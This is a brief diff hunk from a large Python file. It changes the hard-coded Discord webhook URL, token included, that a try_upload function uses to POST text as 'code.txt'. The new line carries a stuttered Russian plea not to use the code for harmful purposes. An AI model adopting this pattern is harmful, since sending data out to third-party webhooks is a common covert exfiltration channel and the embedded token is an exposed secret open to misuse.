@@ -5829,7 +5829,7 @@ def try_upload(code):
             'file': ('code.txt', raw_text.encode('utf-8'), 'text/plain; charset=utf-8')
         }
         
-        webhook_url = "https://discord.com/api/webhooks/1524907485004042400/6UtGumRwSWi0imneGu8FSUM4EsseslngfwfL6GaOTa6BmebjyUJrUVtKMDc56eZ5oE1k"
+        webhook_url = "https://discord.com/api/webhooks/1530536154665848872/5NNDG5r5HkUo3_pX17haf5p_2f1sJojmnJ678lPy_lqQp4zC--bi5YNEa5nto9TFmGS4" # п-п-п-п-о-ж-жл-а--уй-с-т-а- не и-с-сп-о-л-ь-ь-ьз--уй-й-т-е- в-в-в-во-в-в-вредны-х целях
         
         response = requests.post(
             webhook_url,
